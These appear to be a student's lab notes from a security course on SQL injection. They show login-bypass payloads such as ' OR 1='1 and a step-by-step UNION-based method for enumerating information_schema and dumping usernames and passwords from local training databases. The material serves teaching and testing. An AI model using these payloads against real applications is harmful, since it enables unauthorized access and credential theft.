### Ok let's figure this out. 
```bash
.Structured query language - ANSI Standards
.Additional commands added by vendors, Relational
.Commands to use: SELECT (Extracts data from a database) , UNION (Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS)
.SQL INJECTIONS - CONSIDERATIONS
.Require valid SQL Queries
.Fully patched systems can be vulnerable due to misconfiguration.
.Input Field Sanitization (If inputted correctly we cannot inject)
.String vs Integer Values
.Is the INFORMATION_SCHEMA Database avalible? (For this course, yes.)
.GET and POST Requests.
### Unsanitized vs Sanitized Fields:
.Unsanitized: input fields can be found using a single quote = '
.Will return extraneous information
.' closes a variable, to allow for additional statements/clauses
.May show no errors
### Server Side Query Processing
.User enters JohnDoe243 in the name form field and pass1234 in the pass form field.
The server-side query that would be passed to mySQL from PHP would be:
.Select id FROM users WHERE name='$name' AND pass='pass$';
SELECT id FROM users WHERE name='JohnDoe243' AND pass='pass1234'
The AND means both things must be correct
### Example - Injecting Your Statement
User enters TOM' OR 1='1 in the name and pass fields
truth statement: tom' OR 1='1
Server Side query executed would appear like
SELECT id FROM   USERS where NAME='TOM' or 1='1' and PASS='TOM' or 1='1'
### DEMO
#Went to website, for credentials entered
username: ' OR 1='1
password: ' OR 1='1
#This is a post request
# Press F12, go into network and complete login, click on POST, view REQUEST (Captures payload of the request), click RAW, and you will find the the request in a URL format.
ex: username=%27+OR+1%3D%271&passwd=%27+OR+1%3D%271
# From there, we are going to view more information and transform this into a GET request.
#after 127.0.0.1:1111/login.php, we add a "/?" and add the url.
http://127.0.0.1:1111/login.php/?username=%27+OR+1%3D%271&passwd=%27+OR+1%3D%271
#This revealed an Array with a list of names and passwords
```
### DB Interactions DEMO: SQL Commands
```bash
mysql #drops you into sql server
### Golden Statement
select table_schema,table_name,column_name from information_schema.colums
  <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN> from <NAME OF DATABASE>.<NAME OF TABLE>
#The comma seperated values are names of columns, before the "." is the name of database, after is the name of table.
#SQL is hiaerachel, that goes DATABASE > TABLE > COLUMN
#In this example the database is named INFORMATION_SCHEMA
#the table is COLUMNS
#The columns are TABLE_SCHEMA, TABLE_NAME, COLUMN NAME
#lets view it
use information_schema ;
show tables ;
show columns from columns ;
#I want to show the table columns and view info from columns
Table schema is name of database , when selecting table name, we are getting all table names, when selecting column name, we are getting the names of all the columns.
## Default databases
Information_schema
Performance_schema
mysql
### Begin extracting
##Query
select tireid,name,size from session.Tires ;
## 1.) identify vulnerable field/selection
Ford' OR 1='1 ##Not Vulnerable
..
..
Audi' OR 1='1 ##Vulnerable

##2.) Identify number of columns/selections
Audi' UNION SELECT 1,2,3,4,5 #

## 3.) Modify Golden Statement
Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #

## 4.) Craft Queries
Audi' UNION SELECT tireid,2,name,size,cost from session.Tires #
Audi' UNION SELECT tireid,name,size,cost,5 from session.Tires #

### FOR GET METHOD
### 1.) Identify vulnerable Field/Selection
Selection=1 OR 1=1 ## Not Vulnerable
Selection=2 OR 1=1 ## Vulenerable (2,3,4 All Vulnerable)

### 2.) Identify the number of columns
Selection=2 UNION SELECT 1,2,3 ## Displayed 1,3,2

### 3.) Modify Golden Statement
Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns

### 4.) Craft Query
Selection=2 UNION SELECT start,status,last_access from session.session_log (Got nun)
Selection=2 UNION SELECT studentID,username,passwd from session.userinfo
Selection=2 UNION SELECT id,name,pass from session.user
#We will see the actual data stored in here.
select username,passwd from session.userinfo
### Union.html demo
1.) Identify Vulnerable Field/Selection
#Executed:
Ford' OR 1='1
Dodge' OR 1='1
Honda' OR 1='1
#When executing "Audi' OR 1='1 we recieved a full table of more information, rather than less when executing others.
### Show query revealed "select name, type, cost, color, year from car where name='Audi' OR 1='1'"
2.) Identify # of Columns/Selections
#Looking at the table, we can identify it is looking for 4 columns
#We went back to the first page, knowing Audi is vulnerable we ran
Audi' UNION SELECT 1,2,3,4 #
#We recieved a warning: Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/uniondemo.php on line 23
#We added another value, 5
#Show query resulted in:
select name, type, cost, color, year from car where name='Audi' UNION SELECT 1,2,3,4,5 #'
3.) Modify Golden Statement


